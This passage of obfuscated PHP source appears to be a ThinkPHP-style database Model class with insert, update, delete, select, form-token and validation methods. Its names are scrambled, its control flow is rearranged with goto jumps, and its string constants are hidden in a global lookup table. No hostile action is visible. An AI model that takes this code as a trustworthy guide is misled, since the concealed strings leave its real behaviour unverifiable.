BÓœ¢Š„¸; D­ŒÛŞÔãŞ: } protected function _initialize() { } protected function _facade($AÅõÖ™½ç) { $A´±¸îÄ‡ó =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($this->fields)) { foreach ($AÅõÖ™½ç as $Aİî„Ü®ì => $Cø¯›âÉØ¥) { if (!in_array($Aİî„Ü®ì, $this->fields, !0)) { unset($AÅõÖ™½ç[$Aİî„Ü®ì]); } elseif (is_scalar($Cø¯›âÉØ¥)) { $this->_parseType($AÅõÖ™½ç, $Aİî„Ü®ì); } } } if (!empty($this->options[$A´±¸îÄ‡ó[255]])) { $AÅõÖ™½ç = array_map($this->options[$A´±¸îÄ‡ó[255]], $AÅõÖ™½ç); unset($this->options[$A´±¸îÄ‡ó[255]]); } $this->_beforeWrite($AÅõÖ™½ç); return $AÅõÖ™½ç; } protected function _beforeWrite(&$Aç³™Àí¾¬) { } public function add($DôæÈÍ¶ã¾ = '', $E‹†æšˆ— = array(), $Dßøò¡Ø– = false) { goto C‰ËÍ„ˆ“; cØäëô³‚¬: if (!1 === $this->_beforeInsert($DôæÈÍ¶ã¾, $E‹†æšˆ—)) { return !1; } $E§¿‚Æ° = $this->db->insert($DôæÈÍ¶ã¾, $E‹†æšˆ—, $Dßøò¡Ø–); if (!1 !== $E§¿‚Æ°) { $EÄ¾¾‹”–ß = $this->getLastInsID(); if ($EÄ¾¾‹”–ß) { $DôæÈÍ¶ã¾[$this->getPk()] = $EÄ¾¾‹”–ß; $this->_after_insert($DôæÈÍ¶ã¾, $E‹†æšˆ—); return $EÄ¾¾‹”–ß; } $this->_after_insert($DôæÈÍ¶ã¾, $E‹†æšˆ—); } goto eù •Šîò‰; eù •Šîò‰: return $E§¿‚Æ°; goto EìŒ”‡¹±Š; C‰ËÍ„ˆ“: if (empty($DôæÈÍ¶ã¾)) { if (!empty($this->data)) { $DôæÈÍ¶ã¾ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Äº¡•ô™Ÿ][256]); return !1; } } $E‹†æšˆ— = $this->_parseOptions($E‹†æšˆ—); $DôæÈÍ¶ã¾ = $this->_facade($DôæÈÍ¶ã¾); goto cØäëô³‚¬; EìŒ”‡¹±Š: } protected function _beforeInsert(&$BøİÃÙÙ, $C°«…èÑ®œ) { } protected function _after_insert($bÒ¥©³åÛ, $cèä¡ÉÂ¢) { } public function addAll($b¼ñß¬ìê, $D¥İ¬‘Œ…¤ = array(), $Dœ¾Á‡Õéë = false) { goto AòÙÈõ³©ğ; CŸ¯£ëôÃò: return $EÂÌ‹ÊŞ·; goto e¼Ú’İÈºà; E¥² öÙ¡î: foreach ($b¼ñß¬ìê as $cä¾½Ä…Ú => $cœ‚«Òò›) { $b¼ñß¬ìê[$cä¾½Ä…Ú] = $this->_facade($cœ‚«Òò›); } if (method_exists($this->db, $AÜ¢ˆƒ×[257])) { $EÂÌ‹ÊŞ· = $this->db->insertAll($b¼ñß¬ìê, $D¥İ¬‘Œ…¤, $Dœ¾Á‡Õéë); } else { $this->startTrans(); foreach ($b¼ñß¬ìê as $cä¾½Ä…Ú => $cœ‚«Òò›) { $EÂÌ‹ÊŞ· = $this->db->insert($cœ‚«Òò›, $D¥İ¬‘Œ…¤, $Dœ¾Á‡Õéë); } $this->commit(); } if (!1 !== $EÂÌ‹ÊŞ·) { $däÓªºÚ = $this->getLastInsID(); if ($däÓªºÚ) { return $däÓªºÚ; } } goto CŸ¯£ëôÃò; AòÙÈõ³©ğ: $AÜ¢ˆƒ× =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($b¼ñß¬ìê)) { $this->error = think_lang($AÜ¢ˆƒ×[256]); return !1; } $D¥İ¬‘Œ…¤ = $this->_parseOptions($D¥İ¬‘Œ…¤); goto E¥² öÙ¡î; e¼Ú’İÈºà: } public function selectAdd($FŒ½ïùößÓ = '', $B…Œ”¥ƒœß = '', $eŠÁ¹·µ = array()) { $cîÑ½¸œÖ =& $_SERVER[Äº¡•ô™Ÿ]; $eŠÁ¹·µ = $this->_parseOptions($eŠÁ¹·µ); if (!1 === ($DöšãÖÒ«¹ = $this->db->selectInsert($FŒ½ïùößÓ ? $FŒ½ïùößÓ : $eŠÁ¹·µ[$cîÑ½¸œÖ[258]], $B…Œ”¥ƒœß ? $B…Œ”¥ƒœß : $this->getTableName(), $eŠÁ¹·µ))) { $this->error = think_lang($cîÑ½¸œÖ[259]); return !1; } else { return $DöšãÖÒ«¹; } } public function save($FïµğÈåê = '', $Eßéğ‡‹ Å = array()) { goto dñßç‰¬³…; dİÒ‡³ÇËÜ: $Eßéğ‡‹ Å = $this->_parseOptions($Eßéğ‡‹ Å); $då‹œ×ßÏª = $this->getPk(); if (!isset($Eßéğ‡‹ Å[$b£×á‚Ø‹[260]])) { if (isset($FïµğÈåê[$då‹œ×ßÏª])) { $cã×ßÄ·…î[$då‹œ×ßÏª] = $FïµğÈåê[$då‹œ×ßÏª]; $Eßéğ‡‹ Å[$b£×á‚Ø‹[260]] = $cã×ßÄ·…î; unset($FïµğÈåê[$då‹œ×ßÏª]); } else { $this->error = think_lang($b£×á‚Ø‹[259]); return !1; } } goto eÀ‰Æí«’Ş; dñßç‰¬³…: $b£×á‚Ø‹ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($FïµğÈåê)) { if (!empty($this->data)) { $FïµğÈåê = $this->data; $this->data = array(); } else { $this->error = think_lang($b£×á‚Ø‹[256]); return !1; } } $FïµğÈåê = $this->_facade($FïµğÈåê); goto dİÒ‡³ÇËÜ; b§áéš¸œÕ: if (!1 !== $bŠ…”İáÖÜ) { if (isset($bÈ™¨Á¥±Ä)) { $FïµğÈåê[$då‹œ×ßÏª] = $bÈ™¨Á¥±Ä; } $this->_afterUpdate($FïµğÈåê, $Eßéğ‡‹ Å); } return $bŠ…”İáÖÜ; goto eŒÖ¨²Ö©; eÀ‰Æí«’Ş: if (is_array($Eßéğ‡‹ Å[$b£×á‚Ø‹[260]]) && isset($Eßéğ‡‹ Å[$b£×á‚Ø‹[260]][$då‹œ×ßÏª])) { $bÈ™¨Á¥±Ä = $Eßéğ‡‹ Å[$b£×á‚Ø‹[260]][$då‹œ×ßÏª]; } if (!1 === $this->_beforeUpdate($FïµğÈåê, $Eßéğ‡‹ Å)) { return !1; } $bŠ…”İáÖÜ = $this->db->update($FïµğÈåê, $Eßéğ‡‹ Å); goto b§áéš¸œÕ; eŒÖ¨²Ö©: } protected function _beforeUpdate(&$EáÇ„İ¤˜‡, $fÜ×¿Ìô¹Ğ) { } protected function _afterUpdate($A¥¼ÎØ›ĞŸ, $eœ¸ùÅÓ¡ê) { } public function delete($fğÂ×ô = array()) { goto Aƒ³Ìœ…ƒ; FÔµ§†ßŸ‰: $bŒÙ‚ĞÈŒ = $this->db->delete($fğÂ×ô); if (!1 !== $bŒÙ‚ĞÈŒ) { $bò‡…‰æ› = array(); if (isset($bì“‡Ç‰Ø)) { $bò‡…‰æ›[$d”Ò—Ø³·Ş] = $bì“‡Ç‰Ø; } $this->_after_delete($bò‡…‰æ›, $fğÂ×ô); } return $bŒÙ‚ĞÈŒ; goto eùÕŞÑ; Aƒ³Ìœ…ƒ: $Aï»›Ï¾ºâ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($fğÂ×ô) && empty($this->options[$Aï»›Ï¾ºâ[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $d”Ò—Ø³·Ş = $this->getPk(); goto Fè¤÷ŠœùŒ; Fè¤÷ŠœùŒ: if (is_numeric($fğÂ×ô) || is_string($fğÂ×ô)) { if (strpos($fğÂ×ô, $Aï»›Ï¾ºâ[47])) { $bº„ÉºÚ÷[$d”Ò—Ø³·Ş] = array($Aï»›Ï¾ºâ[261], $fğÂ×ô); } else { $bº„ÉºÚ÷[$d”Ò—Ø³·Ş] = $fğÂ×ô; } $this->options[$Aï»›Ï¾ºâ[260]] = $bº„ÉºÚ÷; } $fğÂ×ô = $this->_parseOptions(); if (is_array($fğÂ×ô[$Aï»›Ï¾ºâ[260]]) && isset($fğÂ×ô[$Aï»›Ï¾ºâ[260]][$d”Ò—Ø³·Ş])) { $bì“‡Ç‰Ø = $fğÂ×ô[$Aï»›Ï¾ºâ[260]][$d”Ò—Ø³·Ş]; } goto FÔµ§†ßŸ‰; eùÕŞÑ: } protected function _after_delete($b‰Øì ìš», $bæš­å²šÎ) { } public function select($F¥…·Ø¿ÊÉ = array()) { goto fäÍğÁ“„§; eàà£“ˆÀÍ: $this->_afterSelect($B¡è°Õ…«, $F¥…·Ø¿ÊÉ); return $B¡è°Õ…«; goto BŞØŒ†øòö; Fà·³Šëµ‹: $B¡è°Õ…« = $this->db->select($F¥…·Ø¿ÊÉ); if (!1 === $B¡è°Õ…«) { return !1; } if (empty($B¡è°Õ…«)) { return null; } goto eàà£“ˆÀÍ; fäÍğÁ“„§: $B¥·í–Ô =& $_SERVER[Äº¡•ô™Ÿ]; if (is_string($F¥…·Ø¿ÊÉ) || is_numeric($F¥…·Ø¿ÊÉ)) { $fâÖ˜Š–‘Ô = $this->getPk(); if (strpos($F¥…·Ø¿ÊÉ, $B¥·í–Ô[47])) { $aÌ‚Õ¦÷¡¤[$fâÖ˜Š–‘Ô] = array($B¥·í–Ô[261], $F¥…·Ø¿ÊÉ); } else { $aÌ‚Õ¦÷¡¤[$fâÖ˜Š–‘Ô] = $F¥…·Ø¿ÊÉ; } $this->options[$B¥·í–Ô[260]] = $aÌ‚Õ¦÷¡¤; } elseif (!1 === $F¥…·Ø¿ÊÉ) { $F¥…·Ø¿ÊÉ = $this->_parseOptions(); return $B¥·í–Ô[262] . $this->db->buildSelectSql($F¥…·Ø¿ÊÉ) . $B¥·í–Ô[263]; } $F¥…·Ø¿ÊÉ = $this->_parseOptions(); goto Fà·³Šëµ‹; BŞØŒ†øòö: } protected function _afterSelect(&$dÔöÒÀ×ˆí, $bìãÙ„Æœ) { } public function buildSql($EÀÙ·¾•“ = array()) { $EÀĞ„‰‚ È =& $_SERVER[Äº¡•ô™Ÿ]; $EÀÙ·¾•“ = $this->_parseOptions($EÀÙ·¾•“); return $EÀĞ„‰‚ È[262] . $this->db->buildSelectSql($EÀÙ·¾•“) . $EÀĞ„‰‚ È[263]; } public function optionsValue($Bòõ…İ¡„Ü = null) { if (is_null($Bòõ…İ¡„Ü)) { return $this->options; } elseif (is_array($Bòõ…İ¡„Ü)) { $this->options = array_merge($this->options, $Bòõ…İ¡„Ü); } } protected function _parseOptions($a·øª·«ÍÏ = array()) { goto DŠ‹Àô‘µ; EÔê›åáÀ: if (isset($a·øª·«ÍÏ[$c´ª›Ú‹Õï[260]]) && is_array($a·øª·«ÍÏ[$c´ª›Ú‹Õï[260]]) && !empty($F†Å³ÓŒÖ) && !isset($a·øª·«ÍÏ[$c´ª›Ú‹Õï[267]]) && !isset($a·øª·«ÍÏ[$c´ª›Ú‹Õï[264]])) { foreach ($a·øª·«ÍÏ[$c´ª›Ú‹Õï[260]] as $aÖáÕ½Æëæ => $fÃ“ùĞ°‹ˆ) { $aÖáÕ½Æëæ = trim($aÖáÕ½Æëæ); if (in_array($aÖáÕ½Æëæ, $F†Å³ÓŒÖ, !0)) { if (is_scalar($fÃ“ùĞ°‹ˆ)) { $this->_parseType($a·øª·«ÍÏ[$c´ª›Ú‹Õï[260]], $aÖáÕ½Æëæ); } } elseif (!is_numeric($aÖáÕ½Æëæ) && $c´ª›Ú‹Õï[70] != substr($aÖáÕ½Æëæ, 0, 1) && !1 === strpos($aÖáÕ½Æëæ, $c´ª›Ú‹Õï[93]) && !1 === strpos($aÖáÕ½Æëæ, $c´ª›Ú‹Õï[245]) && !1 === strpos($aÖáÕ½Æëæ, $c´ª›Ú‹Õï[268]) && !1 === strpos($aÖáÕ½Æëæ, $c´ª›Ú‹Õï[269])) { unset($a·øª·«ÍÏ[$c´ª›Ú‹Õï[260]][$aÖáÕ½Æëæ]); } } } $this->_options_filter($a·øª·«ÍÏ); return $a·øª·«ÍÏ; goto Fä¿øí‰; DÉÑ®¥ù…: if (!isset($a·øª·«ÍÏ[$c´ª›Ú‹Õï[264]])) { $a·øª·«ÍÏ[$c´ª›Ú‹Õï[264]] = $this->getTableName(); $F†Å³ÓŒÖ = $this->fields; } else { $F†Å³ÓŒÖ = $this->getDbFields(); } if (!empty($a·øª·«ÍÏ[$c´ª›Ú‹Õï[265]])) { $a·øª·«ÍÏ[$c´ª›Ú‹Õï[264]] .= $c´ª›Ú‹Õï[50] . $a·øª·«ÍÏ[$c´ª›Ú‹Õï[265]]; } $a·øª·«ÍÏ[$c´ª›Ú‹Õï[266]] = $this->name; goto EÔê›åáÀ; DŠ‹Àô‘µ: $c´ª›Ú‹Õï =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($a·øª·«ÍÏ)) { $a·øª·«ÍÏ = array_merge($this->options, $a·øª·«ÍÏ); } $this->options = array(); goto DÉÑ®¥ù…; Fä¿øí‰: } protected function _options_filter(&$E®ÒîïšÇÒ) { } protected function _parseType(&$b¶ª…’àãá, $E“Õãİ©Ì›) { $D¥­«ƒ†Á¦ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($this->options[$D¥­«ƒ†Á¦[270]][$D¥­«ƒ†Á¦[4] . $E“Õãİ©Ì›])) { $BÙ´Õ„µàè = strtolower($this->fields[$D¥­«ƒ†Á¦[237]][$E“Õãİ©Ì›]); if (!1 !== strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[271])) { } elseif (!1 === strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[272]) && !1 !== strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[273])) { $b¶ª…’àãá[$E“Õãİ©Ì›] = intval($b¶ª…’àãá[$E“Õãİ©Ì›]); } elseif (!1 !== strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[274]) || !1 !== strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[275])) { $b¶ª…’àãá[$E“Õãİ©Ì›] = floatval($b¶ª…’àãá[$E“Õãİ©Ì›]); } elseif (!1 !== strpos($BÙ´Õ„µàè, $D¥­«ƒ†Á¦[276])) { $b¶ª…’àãá[$E“Õãİ©Ì›] = (bool) $b¶ª…’àãá[$E“Õãİ©Ì›]; } } } public function find($A¼ªô£¹Şì = array()) { goto d²óÍ‡Û¬; d²óÍ‡Û¬: $EÄ»öñ¼˜‘ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_numeric($A¼ªô£¹Şì) || is_string($A¼ªô£¹Şì)) { $dœ¤È…«Ã[$this->getPk()] = intval($A¼ªô£¹Şì); $this->options[$EÄ»öñ¼˜‘[260]] = $dœ¤È…«Ã; } $this->options[$EÄ»öñ¼˜‘[277]] = 1; goto dà´Ä¾†¾ó; B¾ÓÙêˆ«ô: if (empty($c«ÉóÒ¼´)) { return null; } $this->data = $c«ÉóÒ¼´[0]; $this->_afterFind($this->data, $A¼ªô£¹Şì); goto CÓ³èÀÈ‹; dà´Ä¾†¾ó: $A¼ªô£¹Şì = $this->_parseOptions(); $c«ÉóÒ¼´ = $this->db->select($A¼ªô£¹Şì); if (!1 === $c«ÉóÒ¼´) { return !1; } goto B¾ÓÙêˆ«ô; CÓ³èÀÈ‹: if (!empty($this->options[$EÄ»öñ¼˜‘[278]])) { return $this->returnResult($this->data, $this->options[$EÄ»öñ¼˜‘[278]]); } return $this->data; goto eÆËŒøòĞÂ; eÆËŒøòĞÂ: } protected function _afterFind(&$eæë‡´Â, $f‚šÌ««œ›) { } protected function returnResult($E²éäáÛî, $d²ÂŠ¨Ş = '') { $DÆÅ“ñ¤©Š =& $_SERVER[Äº¡•ô™Ÿ]; if ($d²ÂŠ¨Ş) { if (is_callable($d²ÂŠ¨Ş)) { return call_user_func($d²ÂŠ¨Ş, $E²éäáÛî); } switch (strtolower($d²ÂŠ¨Ş)) { case $DÆÅ“ñ¤©Š[279]: return json_encode($E²éäáÛî); case $DÆÅ“ñ¤©Š[280]: return xml_encode($E²éäáÛî); } } return $E²éäáÛî; } public function parseFieldsMap($Aßº®Ôù”Æ, $DÍ…î•äÙ„ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e½ĞÌ®Ø¢ˆ => $E”Ü¯¹œÛ) { if ($DÍ…î•äÙ„ == 1) { if (isset($Aßº®Ôù”Æ[$E”Ü¯¹œÛ])) { $Aßº®Ôù”Æ[$e½ĞÌ®Ø¢ˆ] = $Aßº®Ôù”Æ[$E”Ü¯¹œÛ]; unset($Aßº®Ôù”Æ[$E”Ü¯¹œÛ]); } } else { if (isset($Aßº®Ôù”Æ[$e½ĞÌ®Ø¢ˆ])) { $Aßº®Ôù”Æ[$E”Ü¯¹œÛ] = $Aßº®Ôù”Æ[$e½ĞÌ®Ø¢ˆ]; unset($Aßº®Ôù”Æ[$e½ĞÌ®Ø¢ˆ]); } } } } return $Aßº®Ôù”Æ; } public function setField($f…Ÿ„ù“‹, $dîöˆ¬—•Ø = '') { if (is_array($f…Ÿ„ù“‹)) { $cãÅÌ²¥óğ = $f…Ÿ„ù“‹; } else { $cãÅÌ²¥óğ[$f…Ÿ„ù“‹] = $dîöˆ¬—•Ø; } return $this->save($cãÅÌ²¥óğ); } public function setAdd($E©¼ò‹İ‰, $B£Ä­¦¼´ = 1) { $A¾— ‡Óù =& $_SERVER[Äº¡•ô™Ÿ]; $EäËÏÙÏ…Ğ = $E©¼ò‹İ‰ . $A¾— ‡Óù[281] . $B£Ä­¦¼´; if ($B£Ä­¦¼´ < 0) { $EäËÏÙÏ…Ğ = $E©¼ò‹İ‰ . $B£Ä­¦¼´; } return $this->setField($E©¼ò‹İ‰, array($A¾— ‡Óù[282], $EäËÏÙÏ…Ğ)); } public function getField($d±¬“‘ù‚ñ, $A©’Ñ‰õéÄ = null) { $aËµ‘’İ¸Ò =& $_SERVER[Äº¡•ô™Ÿ]; $AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[258]] = $d±¬“‘ù‚ñ; $AĞ–ÜæÂô” = $this->_parseOptions($AĞ–ÜæÂô”); $d±¬“‘ù‚ñ = trim($d±¬“‘ù‚ñ); if (strpos($d±¬“‘ù‚ñ, $aËµ‘’İ¸Ò[47])) { if (!isset($AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[277]])) { $AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[277]] = is_numeric($A©’Ñ‰õéÄ) ? $A©’Ñ‰õéÄ : $aËµ‘’İ¸Ò[33]; } $dŒ«´ÕÃ¢ = $this->db->select($AĞ–ÜæÂô”); if (!empty($dŒ«´ÕÃ¢)) { goto CÒšø¿’²İ; CÒšø¿’²İ: $DÂ£õ¶å‚ = explode($aËµ‘’İ¸Ò[47], $d±¬“‘ù‚ñ); $d±¬“‘ù‚ñ = array_keys($dŒ«´ÕÃ¢[0]); $b·¿…¦ª¢» = array_shift($d±¬“‘ù‚ñ); goto DæçÃ Ô”Œ; DæçÃ Ô”Œ: $Båä¼ææ–‡ = array_shift($d±¬“‘ù‚ñ); $F–ÁˆïÊõÍ = array(); $C˜ßŞç‘½Ì = count($DÂ£õ¶å‚); goto f»ÚßÎËÓö; f»ÚßÎËÓö: foreach ($dŒ«´ÕÃ¢ as $B—«¿ã°‘Ä) { $B‰Îã³ÍÔ¿ = $B—«¿ã°‘Ä[$b·¿…¦ª¢»]; if (2 == $C˜ßŞç‘½Ì) { $F–ÁˆïÊõÍ[$B‰Îã³ÍÔ¿] = $B—«¿ã°‘Ä[$Båä¼ææ–‡]; } else { $F–ÁˆïÊõÍ[$B‰Îã³ÍÔ¿] = is_string($A©’Ñ‰õéÄ) ? implode($A©’Ñ‰õéÄ, $B—«¿ã°‘Ä) : $B—«¿ã°‘Ä; } } return $F–ÁˆïÊõÍ; goto DÎ‘Üøø¥ó; DÎ‘Üøø¥ó: } } else { if (!0 !== $A©’Ñ‰õéÄ) { $AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[277]] = is_numeric($A©’Ñ‰õéÄ) ? $A©’Ñ‰õéÄ : 1; } if ($A©’Ñ‰õéÄ === $aËµ‘’İ¸Ò[240]) { unset($AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[277]]); } $B—«¿ã°‘Ä = $this->db->select($AĞ–ÜæÂô”); if (!empty($B—«¿ã°‘Ä)) { if ($A©’Ñ‰õéÄ === $aËµ‘’İ¸Ò[240]) { return reset($B—«¿ã°‘Ä[0]); } if (!0 !== $A©’Ñ‰õéÄ && 1 == $AĞ–ÜæÂô”[$aËµ‘’İ¸Ò[277]]) { return reset($B—«¿ã°‘Ä[0]); } foreach ($B—«¿ã°‘Ä as $b…‡ÏïÒÔš) { $EŠÆÇª½‚[] = $b…‡ÏïÒÔš[$d±¬“‘ù‚ñ]; } return $EŠÆÇª½‚; } } return null; } public function create($c†‰ƒğ©àï = '', $aÀ‹¦±Ö°ƒ = '') { goto D÷´İ¨ÌĞ¾; CàèñœĞàÂ: if (isset($fã”ºåŞÄ)) { if (is_string($fã”ºåŞÄ)) { $fã”ºåŞÄ = explode($bš„î¼´í¥[47], $fã”ºåŞÄ); } if (think_config($bš„î¼´í¥[283])) { $fã”ºåŞÄ[] = think_config($bš„î¼´í¥[284]); } foreach ($c†‰ƒğ©àï as $f…ö¡Ö§—¸ => $e‚ÍÊïÊ’) { if (!in_array($f…ö¡Ö§—¸, $fã”ºåŞÄ)) { unset($c†‰ƒğ©àï[$f…ö¡Ö§—¸]); } } } if (!$this->autoValidation($c†‰ƒğ©àï, $aÀ‹¦±Ö°ƒ)) { return !1; } if (!$this->autoCheckToken($c†‰ƒğ©àï)) { $this->error = think_lang($bš„î¼´í¥[285]); return !1; } goto DÂîĞ×¤ˆ•; bù‰áÆ°ß: return $c†‰ƒğ©àï; goto FïŒˆ•äŠ; DÂîĞ×¤ˆ•: if ($this->autoCheckFields) { $fã”ºåŞÄ = $this->getDbFields(); foreach ($c†‰ƒğ©àï as $f…ö¡Ö§—¸ => $e‚ÍÊïÊ’) { if (!in_array($f…ö¡Ö§—¸, $fã”ºåŞÄ)) { unset($c†‰ƒğ©àï[$f…ö¡Ö§—¸]); } elseif (MAGIC_QUOTES_GPC && is_string($e‚ÍÊïÊ’)) { $c†‰ƒğ©àï[$f…ö¡Ö§—¸] = stripslashes($e‚ÍÊïÊ’); } } } $this->autoOperation($c†‰ƒğ©àï, $aÀ‹¦±Ö°ƒ); $this->data = $c†‰ƒğ©àï; goto bù‰áÆ°ß; d™Ä±ªÇ¨„: $c†‰ƒğ©àï = $this->parseFieldsMap($c†‰ƒğ©àï, 0); $aÀ‹¦±Ö°ƒ = $aÀ‹¦±Ö°ƒ ? $aÀ‹¦±Ö°ƒ : (!empty($c†‰ƒğ©àï[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bš„î¼´í¥[258]])) { $fã”ºåŞÄ = $this->options[$bš„î¼´í¥[258]]; unset($this->options[$bš„î¼´í¥[258]]); } elseif ($aÀ‹¦±Ö°ƒ == THINK_MODEL_INSERT && isset($this->insertFields)) { $fã”ºåŞÄ = $this->insertFields; } elseif ($aÀ‹¦±Ö°ƒ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $fã”ºåŞÄ = $this->updateFields; } goto CàèñœĞàÂ; D÷´İ¨ÌĞ¾: $bš„î¼´í¥ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($c†‰ƒğ©àï)) { $c†‰ƒğ©àï = $_POST; } elseif (is_object($c†‰ƒğ©àï)) { $c†‰ƒğ©àï = get_object_vars($c†‰ƒğ©àï); } if (empty($c†‰ƒğ©àï) || !is_array($c†‰ƒğ©àï)) { $this->error = think_lang($bš„î¼´í¥[256]); return !1; } goto d™Ä±ªÇ¨„; FïŒˆ•äŠ: } public function autoCheckToken($d³ØÊ²àô©) { $ašŒŸ¤‘ˆì =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($this->options[$ašŒŸ¤‘ˆì[286]]) && !$this->options[$ašŒŸ¤‘ˆì[286]]) { return !0; } if (think_config($ašŒŸ¤‘ˆì[283])) { $BÆï¨óçë = think_config($ašŒŸ¤‘ˆì[284]); if (!isset($d³ØÊ²àô©[$BÆï¨óçë]) || Session::get($BÆï¨óçë)) { return !1; } list($cšƒ¤‹‰¸, $dÌ”„ÏÃ) = explode($ašŒŸ¤‘ˆì[70], $d³ØÊ²àô©[$BÆï¨óçë]); if ($dÌ”„ÏÃ && Session::get($BÆï¨óçë . $ašŒŸ¤‘ˆì[93] . $cšƒ¤‹‰¸) === $dÌ”„ÏÃ) { Session::remove($BÆï¨óçë . $ašŒŸ¤‘ˆì[93] . $cšƒ¤‹‰¸); return !0; } if (think_config($ašŒŸ¤‘ˆì[287])) { Session::remove($BÆï¨óçë . $ašŒŸ¤‘ˆì[93] . $cšƒ¤‹‰¸); } return !1; } return !0; } public function regex($E „‰·º”, $D‹°ğÛãîÚ) { $cÅ”–Ÿ¾È =& $_SERVER[Äº¡•ô™Ÿ]; $Bµ¿¾ß‘è = array($cÅ”–Ÿ¾È[288] => $cÅ”–Ÿ¾È[289], $cÅ”–Ÿ¾È[290] => $cÅ”–Ÿ¾È[291], $cÅ”–Ÿ¾È[292] => $cÅ”–Ÿ¾È[293], $cÅ”–Ÿ¾È[294] => $cÅ”–Ÿ¾È[295], $cÅ”–Ÿ¾È[296] => $cÅ”–Ÿ¾È[297], $cÅ”–Ÿ¾È[298] => $cÅ”–Ÿ¾È[299], $cÅ”–Ÿ¾È[300] => $cÅ”–Ÿ¾È[301], $cÅ”–Ÿ¾È[275] => $cÅ”–Ÿ¾È[302], $cÅ”–Ÿ¾È[303] => $cÅ”–Ÿ¾È[304]); if (isset($Bµ¿¾ß‘è[strtolower($D‹°ğÛãîÚ)])) { $D‹°ğÛãîÚ = $Bµ¿¾ß‘è[strtolower($D‹°ğÛãîÚ)]; } return preg_match($D‹°ğÛãîÚ, $E „‰·º”) === 1; } private function autoOperation(&$Dğ¾Ó´·ÄÒ, $fèÏØÂÀâ¦) { $aÌÁ¥ø°Ü¹ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($this->options[$aÌÁ¥ø°Ü¹[305]])) { $bšµòæª¬ë = $this->options[$aÌÁ¥ø°Ü¹[305]]; unset($this->options[$aÌÁ¥ø°Ü¹[305]]); } elseif (!empty($this->_auto)) { $bšµòæª¬ë = $this->_auto; } if (isset($bšµòæª¬ë)) { foreach ($bšµòæª¬ë as $eÙïÂĞ¾Œ¼) { if (empty($eÙïÂĞ¾Œ¼[2])) { $eÙïÂĞ¾Œ¼[2] = THINK_MODEL_INSERT; } if ($fèÏØÂÀâ¦ == $eÙïÂĞ¾Œ¼[2] || $eÙïÂĞ¾Œ¼[2] == THINK_MODEL_BOTH) { switch (trim($eÙïÂĞ¾Œ¼[3])) { case $aÌÁ¥ø°Ü¹[306]: case $aÌÁ¥ø°Ü¹[307]: $dÓ—Åò•· = isset($eÙïÂĞ¾Œ¼[4]) ? (array) $eÙïÂĞ¾Œ¼[4] : array(); if (isset($Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]])) { array_unshift($dÓ—Åò•·, $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]]); } if ($aÌÁ¥ø°Ü¹[306] == $eÙïÂĞ¾Œ¼[3]) { $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]] = call_user_func_array($eÙïÂĞ¾Œ¼[1], $dÓ—Åò•·); } else { $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]] = call_user_func_array(array(&$this, $eÙïÂĞ¾Œ¼[1]), $dÓ—Åò•·); } break; case $aÌÁ¥ø°Ü¹[258]: $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]] = $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[1]]; break; case $aÌÁ¥ø°Ü¹[308]: if ($aÌÁ¥ø°Ü¹[33] === $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]]) { unset($Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]]); } break; case $aÌÁ¥ø°Ü¹[309]: default: $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]] = $eÙïÂĞ¾Œ¼[1]; } if (!1 === $Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]]) { unset($Dğ¾Ó´·ÄÒ[$eÙïÂĞ¾Œ¼[0]]); } } } } return $Dğ¾Ó´·ÄÒ; } protected function autoValidation($a‰ ˆ ·Û, $Cª¿‘­ÒÆˆ) { $BŒ¢ô‚ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($this->options[$BŒ¢ô‚[310]])) { $bÌ³È’«àÜ = $this->options[$BŒ¢ô‚[310]]; unset($this->options[$BŒ¢ô‚[310]]); } elseif (!empty($this->_validate)) { $bÌ³È’«àÜ = $this->_validate; } if (isset($bÌ³È’«àÜ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bÌ³È’«àÜ as $f‘×³ËÏÀ => $DŒÁœ‹–ã’) { if (empty($DŒÁœ‹–ã’[5]) || $DŒÁœ‹–ã’[5] == THINK_MODEL_BOTH || $DŒÁœ‹–ã’[5] == $Cª¿‘­ÒÆˆ) { if (0 == strpos($DŒÁœ‹–ã’[2], $BŒ¢ô‚[311]) && strpos($DŒÁœ‹–ã’[2], $BŒ¢ô‚[312])) { $DŒÁœ‹–ã’[2] = think_lang(substr($DŒÁœ‹–ã’[2], 2, -1)); } $DŒÁœ‹–ã’[3] = isset($DŒÁœ‹–ã’[3]) ? $DŒÁœ‹–ã’[3] : THINK_EXISTS_VALIDATE; 